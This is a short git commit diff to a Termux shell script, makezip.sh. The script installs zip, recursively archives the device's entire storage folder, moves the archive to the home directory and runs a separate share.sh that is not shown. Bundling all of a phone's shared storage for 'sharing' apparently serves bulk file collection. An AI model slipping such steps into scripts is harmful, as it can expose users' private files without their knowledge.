311cce41a680a5b5c399672d31d9cc597d9672d8
harsharti <134540013+harsharti@users.noreply.github.com>
2024-01-12 00:27:35 +0530

    Update makezip.sh

--- makezip.sh
+++ makezip.sh
@@ -2,5 +2,5 @@ yes | pkg install zip -y
 cd storage
 zip -r share.zip $PWD
 cd 
-mv /data/data/com.termux/files/home/storage/shared/Download/share.zip /data/data/com.termux/files/home
+mv /data/data/com.termux/files/home/storage/share.zip /data/data/com.termux/files/home
 ./share.sh
